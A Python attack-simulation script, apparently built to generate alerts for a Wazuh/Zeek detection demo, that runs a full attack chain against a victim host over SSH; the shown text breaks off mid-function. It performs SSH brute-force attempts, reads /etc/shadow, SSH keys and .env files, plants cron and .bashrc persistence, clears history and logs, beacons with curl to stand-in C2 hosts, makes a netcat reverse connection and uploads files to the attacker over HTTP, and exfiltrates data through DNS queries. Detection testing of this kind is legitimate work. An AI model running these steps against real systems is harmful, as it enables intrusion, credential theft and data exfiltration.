#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
全面攻击模拟脚本 - 用于 FusionTrace 安全检测系统演示

功能说明：
此脚本在攻击服务器 C 上运行，攻击靶机服务器 B，产生的日志会被
Wazuh Agent 捕获并传输到 Wazuh Manager（服务器A），同时 Zeek
会捕获网络流量，从而完整展示 FusionTrace 系统的检测能力。

覆盖的 MITRE ATT&CK 战术：
1. 初始访问 (Initial Access) - T1078 有效账户 / T1110 暴力破解
2. 执行 (Execution) - T1059 命令解释器
3. 持久化 (Persistence) - T1053 计划任务 / T1546 事件触发执行
4. 权限提升 (Privilege Escalation) - T1548 滥用提升控制机制
5. 防御规避 (Defense Evasion) - T1070 痕迹清除
6. 凭据访问 (Credential Access) - T1552 不安全凭据 / T1003 凭据转储
7. 发现 (Discovery) - T1082/T1016/T1033/T1049 系统/网络/用户发现
8. 横向移动 (Lateral Movement) - T1021 远程服务
9. 收集 (Collection) - T1560 归档收集的数据
10. 命令与控制 (C2) - T1071 应用层协议 / T1572 协议隧道
11. 数据外泄 (Exfiltration) - T1048 通过替代协议外泄

警告：仅在授权的内网环境中使用！

使用方法：
    python comprehensive_attack.py --victim <IP> --user <用户> --password <密码> [选项]
    
选项：
    --attacker-ip     攻击者IP（本机，用于接收回连）
    --c2-port         C2监听端口，默认8888
    --exfil-port      数据外泄接收端口，默认9999
    --mode            攻击模式：full/quick/stealth/demo，默认 full
    --interval        攻击阶段间隔秒数，默认 3
    --skip-cleanup    跳过清理步骤（保留攻击痕迹）
"""

import argparse
import os
import posixpath
import random
import string
import time
import socket
import threading
import http.server
import socketserver
import base64
import hashlib
import json
from datetime import datetime, timezone
from typing import Optional, List, Tuple, Dict
from dataclasses import dataclass
from enum import Enum

try:
    import paramiko
except ImportError:
    print("请安装 paramiko: pip install paramiko")
    exit(1)

try:
    import requests
except ImportError:
    requests = None  # 可选依赖


# ==========================================
# 配置和常量
# ==========================================

class AttackMode(Enum):
    """攻击模式"""
    FULL = "full"           # 完整攻击链
    QUICK = "quick"         # 快速演示
    STEALTH = "stealth"     # 隐蔽攻击
    DEMO = "demo"           # 分步演示


@dataclass
class AttackConfig:
    """攻击配置"""
    victim_ip: str
    victim_user: str
    victim_password: Optional[str] = None
    victim_key: Optional[str] = None
    victim_port: int = 22
    attacker_ip: Optional[str] = None
    c2_port: int = 8888
    exfil_port: int = 9999
    mode: AttackMode = AttackMode.FULL
    interval: float = 3.0
    skip_cleanup: bool = False


# 可疑命令列表 - 用于产生检测告警
RECON_COMMANDS = [
    "id",
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "cat /etc/shadow 2>/dev/null || echo 'Permission denied'",
    "cat /etc/hosts",
    "hostname",
    "ip addr",
    "ifconfig 2>/dev/null || ip addr",
    "netstat -tulpn 2>/dev/null || ss -tulpn",
    "ps aux",
    "ps -ef",
    "cat /proc/version",
    "cat /etc/os-release",
    "env",
    "printenv",
    "last -n 10",
    "w",
    "who",
    "history 2>/dev/null || cat ~/.bash_history 2>/dev/null",
    "ls -la /root 2>/dev/null",
    "ls -la /home",
    "find /home -name '*.ssh' 2>/dev/null | head -5",
    "cat ~/.ssh/authorized_keys 2>/dev/null",
    "crontab -l 2>/dev/null",
    "systemctl list-units --type=service 2>/dev/null | head -20",
    "df -h",
    "free -m",
    "lsof -i 2>/dev/null | head -20",
]

SUSPICIOUS_COMMANDS = [
    # 网络扫描
    "for i in $(seq 1 10); do ping -c 1 192.168.1.$i 2>/dev/null &; done; wait",
    "nc -zv 127.0.0.1 22 2>&1",
    # 权限检查
    "sudo -l 2>/dev/null || echo 'sudo not available'",
    "find / -perm -4000 2>/dev/null | head -10",  # SUID
    "find / -perm -2000 2>/dev/null | head -10",  # SGID
    "getcap -r / 2>/dev/null | head -10",
    # 敏感文件访问
    "cat /etc/sudoers 2>/dev/null | head -20",
    "ls -la /etc/cron.d/",
    "ls -la /var/spool/cron/",
]


# ==========================================
# 工具函数
# ==========================================

def utc_ts() -> str:
    """获取UTC时间戳"""
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


def local_ts() -> str:
    """获取本地时间"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def rand_tag(n: int = 6) -> str:
    """生成随机标签"""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def print_stage(stage_num: int, stage_name: str, mitre_tactic: str, mitre_technique: str):
    """打印攻击阶段"""
    print("\n" + "=" * 70)
    print(f"  阶段 {stage_num}: {stage_name}")
    print(f"  MITRE ATT&CK: {mitre_tactic} | {mitre_technique}")
    print("=" * 70)


def print_action(action: str, details: str = ""):
    """打印攻击动作"""
    ts = local_ts()
    if details:
        print(f"[{ts}] ▶ {action}")
        print(f"         └─ {details}")
    else:
        print(f"[{ts}] ▶ {action}")


def print_result(success: bool, message: str):
    """打印结果"""
    icon = "✓" if success else "✗"
    print(f"         {icon} {message}")


# ==========================================
# SSH 连接管理
# ==========================================

class SSHConnection:
    """SSH 连接管理类"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.client: Optional[paramiko.SSHClient] = None
        self.sftp: Optional[paramiko.SFTPClient] = None
    
    def connect(self) -> bool:
        """建立SSH连接"""
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            if self.config.victim_key:
                pkey = paramiko.RSAKey.from_private_key_file(self.config.victim_key)
                self.client.connect(
                    hostname=self.config.victim_ip,
                    port=self.config.victim_port,
                    username=self.config.victim_user,
                    pkey=pkey,
                    timeout=15
                )
            else:
                self.client.connect(
                    hostname=self.config.victim_ip,
                    port=self.config.victim_port,
                    username=self.config.victim_user,
                    password=self.config.victim_password,
                    timeout=15
                )
            return True
        except Exception as e:
            print(f"SSH连接失败: {e}")
            return False
    
    def execute(self, cmd: str, timeout: int = 30) -> Tuple[int, str, str]:
        """执行命令"""
        if not self.client:
            return -1, "", "Not connected"
        
        try:
            stdin, stdout, stderr = self.client.exec_command(cmd, timeout=timeout)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            code = stdout.channel.recv_exit_status()
            return code, out, err
        except Exception as e:
            return -1, "", str(e)
    
    def open_sftp(self) -> paramiko.SFTPClient:
        """打开SFTP连接"""
        if not self.sftp:
            self.sftp = self.client.open_sftp()
        return self.sftp
    
    def upload_file(self, local_path: str, remote_path: str):
        """上传文件"""
        sftp = self.open_sftp()
        sftp.put(local_path, remote_path)
    
    def download_file(self, remote_path: str, local_path: str):
        """下载文件"""
        sftp = self.open_sftp()
        sftp.get(remote_path, local_path)
    
    def close(self):
        """关闭连接"""
        if self.sftp:
            self.sftp.close()
        if self.client:
            self.client.close()


# ==========================================
# 攻击模块
# ==========================================

class AttackSimulator:
    """攻击模拟器"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.ssh: Optional[SSHConnection] = None
        self.tag = rand_tag()
        self.work_dir = f"/tmp/attack_{self.tag}"
        self.compromised = False
        self.collected_data: List[str] = []
    
    def run(self):
        """运行攻击"""
        print("\n" + "=" * 70)
        print("  FusionTrace 全面攻击模拟")
        print(f"  目标: {self.config.victim_ip}")
        print(f"  模式: {self.config.mode.value}")
        print(f"  会话标签: {self.tag}")
        print("=" * 70)
        
        try:
            if self.config.mode == AttackMode.FULL:
                self._run_full_attack()
            elif self.config.mode == AttackMode.QUICK:
                self._run_quick_attack()
            elif self.config.mode == AttackMode.STEALTH:
                self._run_stealth_attack()
            elif self.config.mode == AttackMode.DEMO:
                self._run_demo_attack()
        except KeyboardInterrupt:
            print("\n\n⚠️ 用户中断攻击")
        finally:
            if self.ssh:
                if not self.config.skip_cleanup:
                    self._cleanup()
                self.ssh.close()
        
        print("\n" + "=" * 70)
        print("  攻击模拟完成")
        print("=" * 70)
    
    # ==========================================
    # 攻击模式
    # ==========================================
    
    def _run_full_attack(self):
        """完整攻击链"""
        # 阶段 1: 初始访问
        self._stage_initial_access()
        
        # 检查SSH连接是否成功，失败则终止
        if not self.compromised:
            print("\n" + "=" * 70)
            print("  ❌ 攻击终止：SSH连接失败，无法继续后续阶段")
            print("  请检查：1) 密码是否正确  2) 用户名是否存在  3) SSH服务是否运行")
            print("=" * 70)
            return
        
        self._wait()
        
        # 阶段 2: 执行
        self._stage_execution()
        self._wait()
        
        # 阶段 3: 发现
        self._stage_discovery()
        self._wait()
        
        # 阶段 4: 凭据访问
        self._stage_credential_access()
        self._wait()
        
        # 阶段 5: 权限提升尝试
        self._stage_privilege_escalation()
        self._wait()
        
        # 阶段 6: 持久化
        self._stage_persistence()
        self._wait()
        
        # 阶段 7: 防御规避
        self._stage_defense_evasion()
        self._wait()
        
        # 阶段 8: 横向移动准备
        self._stage_lateral_movement_prep()
        self._wait()
        
        # 阶段 9: 收集
        self._stage_collection()
        self._wait()
        
        # 阶段 10: C2 通信
        self._stage_c2_communication()
        self._wait()
        
        # 阶段 11: 数据外泄
        self._stage_exfiltration()
    
    def _run_quick_attack(self):
        """快速攻击 - 跳过部分阶段"""
        self._stage_initial_access()
        
        if not self.compromised:
            print("\n❌ 攻击终止：SSH连接失败")
            return
        
        self._wait()
        self._stage_execution()
        self._wait()
        self._stage_discovery()
        self._wait()
        self._stage_collection()
        self._wait()
        self._stage_exfiltration()
    
    def _run_stealth_attack(self):
        """隐蔽攻击 - 减少日志产生"""
        print_action("隐蔽模式", "减少命令执行频率，使用更隐蔽的技术")
        
        self._stage_initial_access()
        
        if not self.compromised:
            print("\n❌ 攻击终止：SSH连接失败")
            return
        
        time.sleep(random.uniform(5, 15))
        
        # 只执行少量发现命令
        print_stage(2, "隐蔽信息收集", "Discovery", "T1082")
        if self.ssh:
            for cmd in ["id", "uname -a", "cat /etc/passwd"]:
                self.ssh.execute(cmd)
                time.sleep(random.uniform(10, 30))
        
        # 隐蔽数据收集
        self._stage_collection()
        time.sleep(random.uniform(5, 15))
        
        # 慢速外泄
        self._stage_exfiltration_slow()
    
    def _run_demo_attack(self):
        """演示模式 - 每步暂停等待确认"""
        # 首先执行初始访问
        print(f"\n准备执行阶段 1: 初始访问")
        input("按 Enter 继续...")
        self._stage_initial_access()
        
        if not self.compromised:
            print("\n❌ 攻击终止：SSH连接失败")
            return
        
        stages = [
            ("执行", self._stage_execution),
            ("发现", self._stage_discovery),
            ("凭据访问", self._stage_credential_access),
            ("权限提升", self._stage_privilege_escalation),
            ("持久化", self._stage_persistence),
            ("防御规避", self._stage_defense_evasion),
            ("横向移动准备", self._stage_lateral_movement_prep),
            ("收集", self._stage_collection),
            ("C2通信", self._stage_c2_communication),
            ("数据外泄", self._stage_exfiltration),
        ]
        
        for i, (name, func) in enumerate(stages, 2):
            print(f"\n准备执行阶段 {i}: {name}")
            input("按 Enter 继续...")
            func()
    
    # ==========================================
    # 攻击阶段实现
    # ==========================================
    
    def _stage_initial_access(self):
        """阶段1: 初始访问"""
        print_stage(1, "初始访问", "Initial Access", "T1078/T1110")
        
        # 1.1 SSH 暴力破解尝试（产生失败登录日志）
        print_action("SSH暴力破解尝试", "产生失败登录告警")
        self._simulate_brute_force()
        
        # 1.2 成功登录
        print_action("SSH认证成功", f"用户 {self.config.victim_user}")
        self.ssh = SSHConnection(self.config)
        if self.ssh.connect():
            print_result(True, "SSH会话建立成功")
            self.compromised = True
            
            # 创建工作目录
            self.ssh.execute(f"mkdir -p {self.work_dir}")
            print_result(True, f"工作目录创建: {self.work_dir}")
        else:
            print_result(False, "SSH连接失败")
            return
    
    def _stage_execution(self):
        """阶段2: 执行"""
        print_stage(2, "命令执行", "Execution", "T1059")
        
        if not self.ssh:
            return
        
        # 2.1 Shell 命令执行
        print_action("Bash命令执行", "T1059.004")
        code, out, _ = self.ssh.execute("bash -c 'echo Attack_Session_Started; id'")
        if code == 0:
            print_result(True, "Bash执行成功")
        
        # 2.2 Python 执行
        print_action("Python脚本执行", "T1059.006")
        python_cmd = '''python3 -c "import os; print('Python Execution:', os.uname())"'''
        code, out, _ = self.ssh.execute(python_cmd)
        if code == 0:
            print_result(True, "Python执行成功")
        else:
            # 尝试 python2
            self.ssh.execute('python -c "import os; print os.uname()"')
        
        # 2.3 创建和执行脚本
        print_action("脚本文件创建和执行", "T1059.004")
        script_path = f"{self.work_dir}/recon.sh"
        script_content = '''#!/bin/bash
echo "=== Reconnaissance Script ==="
echo "Hostname: $(hostname)"
echo "User: $(whoami)"
echo "Date: $(date)"
echo "Uptime: $(uptime)"
'''
        self.ssh.execute(f"cat > {script_path} << 'SCRIPT'\n{script_content}\nSCRIPT")
        self.ssh.execute(f"chmod +x {script_path}")
        code, out, _ = self.ssh.execute(f"bash {script_path}")
        if code == 0:
            print_result(True, "脚本执行成功")
    
    def _stage_discovery(self):
        """阶段3: 发现"""
        print_stage(3, "信息发现", "Discovery", "T1082/T1016/T1033/T1049")
        
        if not self.ssh:
            return
        
        # 3.1 系统信息发现 (T1082)
        print_action("系统信息发现", "T1082")
        sys_commands = ["uname -a", "cat /etc/os-release", "cat /proc/version", "hostname -f"]
        for cmd in sys_commands:
            code, out, _ = self.ssh.execute(cmd)
            if code == 0 and out.strip():
                print_result(True, f"{cmd[:30]}...")
        
        # 3.2 网络配置发现 (T1016)
        print_action("网络配置发现", "T1016")
        net_commands = [
            "ip addr",
            "ip route",
            "cat /etc/resolv.conf",
            "netstat -tulpn 2>/dev/null || ss -tulpn",
        ]
        for cmd in net_commands:
            self.ssh.execute(cmd)
        print_result(True, "网络信息收集完成")
        
        # 3.3 用户发现 (T1033)
        print_action("用户和组发现", "T1033/T1087")
        user_commands = [
            "whoami",
            "id",
            "cat /etc/passwd",
            "cat /etc/group",
            "who",
            "w",
            "last -n 20",
        ]
        for cmd in user_commands:
            self.ssh.execute(cmd)
        print_result(True, "用户信息收集完成")
        
        # 3.4 进程发现 (T1057)
        print_action("进程发现", "T1057")
        self.ssh.execute("ps aux")
        self.ssh.execute("ps -ef --forest")
        print_result(True, "进程列表收集完成")
        
        # 3.5 文件和目录发现 (T1083)
        print_action("文件和目录发现", "T1083")
        file_commands = [
            "ls -la /",
            "ls -la /home",
            "ls -la /root 2>/dev/null",
            "ls -la /var/log",
            "find /home -type f -name '*.txt' 2>/dev/null | head -10",
            "find /home -type f -name '*.conf' 2>/dev/null | head -10",
        ]
        for cmd in file_commands:
            self.ssh.execute(cmd)
        print_result(True, "文件系统枚举完成")
        
        # 3.6 软件发现 (T1518)
        print_action("软件发现", "T1518")
        software_commands = [
            "dpkg -l 2>/dev/null | head -30 || rpm -qa 2>/dev/null | head -30",
            "which python python3 perl ruby gcc make curl wget nc nmap 2>/dev/null",
        ]
        for cmd in software_commands:
            self.ssh.execute(cmd)
        print_result(True, "软件清单收集完成")
    
    def _stage_credential_access(self):
        """阶段4: 凭据访问"""
        print_stage(4, "凭据访问", "Credential Access", "T1552/T1003")
        
        if not self.ssh:
            return
        
        # 4.1 不安全的凭据存储 (T1552)
        print_action("搜索不安全的凭据", "T1552")
        cred_commands = [
            "cat ~/.ssh/authorized_keys 2>/dev/null",
            "cat ~/.ssh/id_rsa 2>/dev/null || echo 'No private key found'",
            "cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|secret\\|key\\|token' | head -10",
            "find /home -name '*.pem' -o -name '*.key' 2>/dev/null | head -5",
            "find /home -name '.env' 2>/dev/null | head -5",
            "cat /home/*/.env 2>/dev/null",
            "cat ~/.netrc 2>/dev/null",
            "cat ~/.pgpass 2>/dev/null",
        ]
        for cmd in cred_commands:
            self.ssh.execute(cmd)
        print_result(True, "凭据搜索完成")
        
        # 4.2 /etc/shadow 访问尝试 (T1003.008)
        print_action("尝试访问密码哈希", "T1003.008")
        code, out, _ = self.ssh.execute("cat /etc/shadow 2>/dev/null")
        if code == 0 and out.strip():
            print_result(True, "成功读取 /etc/shadow")
            self.collected_data.append("/etc/shadow")
        else:
            print_result(False, "无权限读取 /etc/shadow")
        
        # 4.3 密码文件提取
        print_action("密码配置文件", "T1003")
        self.ssh.execute("cat /etc/passwd")
        self.ssh.execute("cat /etc/login.defs 2>/dev/null | head -30")
        print_result(True, "密码配置收集完成")
        
        # 4.4 搜索配置文件中的凭据
        print_action("搜索配置文件中的凭据", "T1552.001")
        search_patterns = [
            "grep -r 'password' /etc/*.conf 2>/dev/null | head -10",
            "grep -r 'secret' /var/www 2>/dev/null | head -10",
            "grep -r 'api_key' /home 2>/dev/null | head -10",
        ]
        for cmd in search_patterns:
            self.ssh.execute(cmd)
        print_result(True, "配置文件搜索完成")
    
    def _stage_privilege_escalation(self):
        """阶段5: 权限提升"""
        print_stage(5, "权限提升尝试", "Privilege Escalation", "T1548")
        
        if not self.ssh:
            return
        
        # 5.1 SUID/SGID 二进制文件 (T1548.001)
        print_action("搜索SUID/SGID二进制文件", "T1548.001")
        self.ssh.execute("find / -perm -4000 -type f 2>/dev/null | head -20")
        self.ssh.execute("find / -perm -2000 -type f 2>/dev/null | head -20")
        print_result(True, "SUID/SGID搜索完成")
        
        # 5.2 Sudo 权限检查 (T1548.003)
        print_action("检查Sudo权限", "T1548.003")
        code, out, _ = self.ssh.execute("sudo -l 2>/dev/null")
        if code == 0 and out.strip():
            print_result(True, f"Sudo权限: 有可用权限")
        else:
            print_result(False, "无Sudo权限或需要密码")
        
        # 5.3 Linux Capabilities
        print_action("检查Capabilities", "T1548")
        self.ssh.execute("getcap -r / 2>/dev/null | head -10")
        print_result(True, "Capabilities检查完成")
        
        # 5.4 可写的敏感目录
        print_action("检查可写的敏感路径", "T1548")
        writable_checks = [
            "ls -la /etc/cron.d/",
            "ls -la /etc/cron.daily/",
            "test -w /etc/passwd && echo 'WRITABLE: /etc/passwd'",
            "test -w /etc/crontab && echo 'WRITABLE: /etc/crontab'",
        ]
        for cmd in writable_checks:
            self.ssh.execute(cmd)
        print_result(True, "权限检查完成")
    
    def _stage_persistence(self):
        """阶段6: 持久化"""
        print_stage(6, "持久化", "Persistence", "T1053/T1546")
        
        if not self.ssh:
            return
        
        # 6.1 Cron 持久化 (T1053.003)
        print_action("Cron任务持久化", "T1053.003")
        cron_job = f"# FusionTrace Test - {self.tag}\n* * * * * echo 'beacon_{self.tag}' > /dev/null 2>&1\n"
        cron_path = f"{self.work_dir}/attack_cron"
        
        # 先保存当前 crontab
        self.ssh.execute("crontab -l > /tmp/cron_backup 2>/dev/null || true")
        
        # 添加恶意 cron
        self.ssh.execute(f"echo '{cron_job}' > {cron_path}")
        code, _, _ = self.ssh.execute(f"(crontab -l 2>/dev/null; cat {cron_path}) | crontab -")
        if code == 0:
            print_result(True, "Cron任务添加成功")
        else:
            print_result(False, "Cron任务添加失败")
        
        # 6.2 Bashrc 持久化 (T1546.004)
        print_action(".bashrc持久化", "T1546.004")
        bashrc_backdoor = f"\n# FusionTrace Test - {self.tag}\nalias ls='ls --color=auto; echo beacon_{self.tag} > /dev/null'\n"
        code, _, _ = self.ssh.execute(f"echo '{bashrc_backdoor}' >> ~/.bashrc")
        if code == 0:
            print_result(True, ".bashrc后门添加成功")
        
        # 6.3 SSH authorized_keys 后门 (T1098.004)
        print_action("SSH密钥后门检查", "T1098.004")
        self.ssh.execute("ls -la ~/.ssh/")
        self.ssh.execute("cat ~/.ssh/authorized_keys 2>/dev/null | wc -l")
        print_result(True, "SSH密钥状态检查完成")
        
        # 6.4 创建隐藏文件
        print_action("创建隐藏后门文件", "T1564.001")
        hidden_script = f'''#!/bin/bash
# Hidden backdoor script - {self.tag}
while true; do
    sleep 60
    echo "beacon" > /dev/null
done
'''
        hidden_path = f"/tmp/.hidden_{self.tag}"
        self.ssh.execute(f"cat > {hidden_path} << 'EOF'\n{hidden_script}\nEOF")
        self.ssh.execute(f"chmod +x {hidden_path}")
        print_result(True, f"隐藏脚本创建: {hidden_path}")
    
    def _stage_defense_evasion(self):
        """阶段7: 防御规避"""
        print_stage(7, "防御规避", "Defense Evasion", "T1070")
        
        if not self.ssh:
            return
        
        # 7.1 时间戳修改 (T1070.006)
        print_action("时间戳篡改", "T1070.006")
        self.ssh.execute(f"touch -r /etc/passwd {self.work_dir}/recon.sh 2>/dev/null")
        print_result(True, "时间戳修改完成")
        
        # 7.2 历史清除 (T1070.003)
        print_action("历史命令清除", "T1070.003")
        self.ssh.execute("history -c 2>/dev/null || true")
        self.ssh.execute("unset HISTFILE")
        self.ssh.execute("export HISTSIZE=0")
        print_result(True, "历史命令清除完成")
        
        # 7.3 日志篡改尝试 (T1070.002)
        print_action("日志清除尝试", "T1070.002")
        log_commands = [
            "cat /dev/null > ~/.bash_history 2>/dev/null",
            "rm -f /var/log/auth.log.* 2>/dev/null",  # 可能需要权限
            "echo '' > /var/log/lastlog 2>/dev/null",
        ]
        for cmd in log_commands:
            self.ssh.execute(cmd)
        print_result(True, "日志清除尝试完成")
        
        # 7.4 进程隐藏技术
        print_action("进程伪装", "T1036")
        # 使用正常进程名运行脚本
        self.ssh.execute(f"cp /bin/bash {self.work_dir}/[kworker/0:1]")
        print_result(True, "进程伪装文件创建")
    
    def _stage_lateral_movement_prep(self):
        """阶段8: 横向移动准备"""
        print_stage(8, "横向移动准备", "Lateral Movement", "T1021/T1018")
        
        if not self.ssh:
            return
        
        # 8.1 内网主机发现 (T1018)
        print_action("内网主机发现", "T1018")
        # ARP 表
        self.ssh.execute("arp -a 2>/dev/null || ip neigh")
        # 网段扫描
        self.ssh.execute("for i in 1 2 3 4 5; do ping -c 1 -W 1 192.168.1.$i 2>/dev/null &; done; wait")
        print_result(True, "内网扫描完成")
        
        # 8.2 端口扫描 (T1046)
        print_action("端口扫描", "T1046")
        # 使用 /dev/tcp 进行简单端口扫描
        port_scan_cmd = '''
for port in 22 80 443 3306 5432 6379 8080; do
    (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo "Port $port open"
done
'''
        self.ssh.execute(f"bash -c '{port_scan_cmd}'")
        print_result(True, "端口扫描完成")
        
        # 8.3 SSH 密钥收集用于横向移动
        print_action("SSH密钥收集", "T1021.004")
        ssh_commands = [
            "cat ~/.ssh/known_hosts 2>/dev/null | head -10",
            "cat ~/.ssh/config 2>/dev/null",
            "find /home -name 'id_rsa' 2>/dev/null",
            "find /home -name 'id_ed25519' 2>/dev/null",
        ]
        for cmd in ssh_commands:
            self.ssh.execute(cmd)
        print_result(True, "SSH信息收集完成")
        
        # 8.4 远程服务尝试
        print_action("远程服务连接尝试", "T1021")
        # SSH 连接测试（会产生日志）
        self.ssh.execute("ssh -o BatchMode=yes -o ConnectTimeout=3 root@192.168.1.1 echo test 2>&1 || true")
        print_result(True, "远程服务探测完成")
    
    def _stage_collection(self):
        """阶段9: 数据收集"""
        print_stage(9, "数据收集", "Collection", "T1560/T1119")
        
        if not self.ssh:
            return
        
        # 9.1 敏感文件识别 (T1005)
        print_action("敏感文件识别", "T1005")
        sensitive_search = [
            "find /home -type f \\( -name '*.doc*' -o -name '*.xls*' -o -name '*.pdf' -o -name '*.txt' \\) 2>/dev/null | head -20",
            "find /home -type f -name '*.sql' 2>/dev/null | head -10",
            "find /var/www -type f -name '*.php' 2>/dev/null | head -10",
            "find /home -type f -name '*.db' 2>/dev/null | head -10",
        ]
        for cmd in sensitive_search:
            self.ssh.execute(cmd)
        print_result(True, "敏感文件搜索完成")
        
        # 9.2 创建测试数据
        print_action("创建模拟敏感数据", "T1119")
        test_data = f'''
=== Simulated Sensitive Data ===
Session: {self.tag}
Timestamp: {utc_ts()}

[Credentials]
admin:SuperSecret123
database:db_password_456
api_key:sk-1234567890abcdef

[Financial Data]
Account: 1234-5678-9012-3456
Balance: $10,000,000

[Personal Info]
SSN: 123-45-6789
DOB: 1990-01-01
'''
        data_file = f"{self.work_dir}/sensitive_data.txt"
        self.ssh.execute(f"echo '{test_data}' > {data_file}")
        print_result(True, "测试数据创建完成")
        
        # 9.3 数据压缩归档 (T1560.001)
        print_action("数据归档压缩", "T1560.001")
        archive_path = f"{self.work_dir}/exfil_data_{self.tag}.tar.gz"
        
        # 收集并打包数据
        self.ssh.execute(f"tar -czvf {archive_path} {self.work_dir}/*.txt {self.work_dir}/*.sh 2>/dev/null")
        
        # 获取归档大小
        code, out, _ = self.ssh.execute(f"ls -lh {archive_path} 2>/dev/null")
        if code == 0:
            print_result(True, f"归档创建成功: {archive_path}")
            self.collected_data.append(archive_path)
        
        # 9.4 创建大文件用于外泄测试
        print_action("创建外泄测试文件", "T1560")
        large_file = f"{self.work_dir}/large_exfil_{self.tag}.bin"
        self.ssh.execute(f"dd if=/dev/zero of={large_file} bs=1M count=10 status=none 2>/dev/null")
        print_result(True, f"大文件创建: 10MB")
        self.collected_data.append(large_file)
    
    def _stage_c2_communication(self):
        """阶段10: C2 通信"""
        print_stage(10, "命令与控制通信", "Command and Control", "T1071/T1572")
        
        if not self.ssh:
            return
        
        # 10.1 HTTP C2 Beacon (T1071.001)
        print_action("HTTP Beacon 模拟", "T1071.001")
        
        # 模拟向C2服务器发送信标
        c2_urls = [
            "http://evil-c2.example.com/beacon",
            "http://malware-c2.example.com/check-in",
            f"http://{self.config.attacker_ip}:{self.config.c2_port}/beacon" if self.config.attacker_ip else None,
        ]
        
        for url in c2_urls:
            if url:
                # 使用 curl 发送 beacon（产生网络日志）
                beacon_data = base64.b64encode(f"host={self.config.victim_ip}&session={self.tag}".encode()).decode()
                cmd = f"curl -s -m 3 -X POST -d 'data={beacon_data}' '{url}' 2>/dev/null || true"
                self.ssh.execute(cmd)
        print_result(True, "HTTP Beacon 发送完成")
        
        # 10.2 DNS C2 隧道模拟 (T1071.004)
        print_action("DNS 隧道模拟", "T1071.004")
        
        # 生成看起来像 DNS 隧道的查询
        encoded_data = base64.b32encode(f"session={self.tag}".encode()).decode().lower().rstrip('=')
        tunnel_domains = [
            f"{encoded_data[:30]}.tunnel.evil-c2.net",
            f"beacon.{self.tag}.malware-dns.com",
            f"exfil.data.attacker-c2.net",
        ]
        
        for domain in tunnel_domains:
            self.ssh.execute(f"nslookup {domain} 2>/dev/null || host {domain} 2>/dev/null || dig {domain} 2>/dev/null || true")
        print_result(True, "DNS 隧道模拟完成")
        
        # 10.3 HTTPS C2 (T1071.001)
        print_action("HTTPS C2 通信", "T1071.001")
        https_c2 = [
            "curl -s -m 3 -k https://malicious-server.com/api/check 2>/dev/null || true",
            "wget -q -T 3 --no-check-certificate https://c2.evil.com/cmd -O /dev/null 2>/dev/null || true",
        ]
        for cmd in https_c2:
            self.ssh.execute(cmd)
        print_result(True, "HTTPS C2 通信模拟完成")
        
        # 10.4 反向连接尝试
        if self.config.attacker_ip:
            print_action("反向连接尝试", "T1571")
            # 尝试反向连接（会被网络监控捕获）
            reverse_cmd = f"bash -c 'echo | nc -w 3 {self.config.attacker_ip} {self.config.c2_port} 2>/dev/null' || true"
            self.ssh.execute(reverse_cmd)
            print_result(True, "反向连接尝试完成")
    
    def _stage_exfiltration(self):
        """阶段11: 数据外泄"""
        print_stage(11, "数据外泄", "Exfiltration", "T1048")
        
        if not self.ssh:
            return
        
        # 11.1 通过 HTTP 外泄 (T1048.003)
        print_action("HTTP 数据外泄", "T1048.003")
        
        if self.config.attacker_ip:
            exfil_url = f"http://{self.config.attacker_ip}:{self.config.exfil_port}/upload"
            
            # 上传敏感数据
            for data_path in self.collected_data:
                cmd = f"curl -s -m 10 -X POST -F 'file=@{data_path}' '{exfil_url}' 2>/dev/null || true"
                self.ssh.execute(cmd)
            print_result(True, "HTTP 数据外泄完成")
        else:
            print_result(False, "未配置攻击者IP，跳过HTTP外泄")
        
        # 11.2 通过 SCP/SFTP 外泄 (T1048.002)
        print_action("SFTP 大文件外泄", "T1048.002")
        
        # 下载大文件到攻击者机器
        large_file = f"{self.work_dir}/large_exfil_{self.tag}.bin"
        local_path = os.path.expanduser(f"~/exfil_{self.tag}.bin")
        
        try:
            self.ssh.download_file(large_file, local_path)
            file_size = os.path.getsize(local_path)
            print_result(True, f"文件外泄成功: {file_size / (1024*1024):.2f} MB")
        except Exception as e:
            print_result(False, f"文件外泄失败: {e}")
        
        # 11.3 DNS 外泄模拟 (T1048.001)
        print_action("DNS 数据外泄", "T1048.001")
        
        # 模拟通过 DNS 查询外泄数据
        sample_data = f"user={self.config.victim_user}&ip={self.config.victim_ip}"
        encoded = base64.b32encode(sample_data.encode()).decode().lower()[:60]
        
        dns_exfil_queries = [
            f"{encoded[:20]}.exfil.attacker.com",
            f"{encoded[20:40]}.data.evil-dns.net",
            f"chunk1.{self.tag}.exfiltrate.com",
        ]
        
        for query in dns_exfil_queries:
            self.ssh.execute(f"nslookup {query} 2>/dev/null || true")
        print_result(True, "DNS 外泄模拟完成")
        
        # 11.4 外泄统计
        print_action("外泄统计", "")
        print_result(True, f"已外泄 {len(self.collected_data)} 个数据项")
    
    def _stage_exfiltration_slow(self):
        """慢速外泄 - 用于隐蔽模式"""
        if not self.ssh:
            return
        
        print_action("慢速数据外泄", "T1048")
        
        # 小块数据外泄
        for i in range(5):
            chunk = f"data_chunk_{i}_{self.tag}"
            encoded = base64.b64encode(chunk.encode()).decode()
            query = f"{encoded[:30]}.slow.exfil.net"
            self.ssh.execute(f"nslookup {query} 2>/dev/null || true")
            time.sleep(random.uniform(5, 15))
        
        print_result(True, "慢速外泄完成")
    
    # ==========================================
    # 辅助方法
    # ==========================================
    
    def _simulate_brute_force(self):
        """模拟 SSH 暴力破解尝试"""
        print_action("模拟失败登录尝试", "产生认证失败日志")
        
        failed_client = paramiko.SSHClient()
        failed_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # 尝试几次错误密码
        wrong_passwords = ["admin", "123456", "password", "root"]
        
        for wrong_pass in wrong_passwords[:3]:  # 只尝试3次
            try:
                failed_client.connect(
                    hostname=self.config.victim_ip,
                    port=self.config.victim_port,
                    username="admin",  # 使用常见用户名
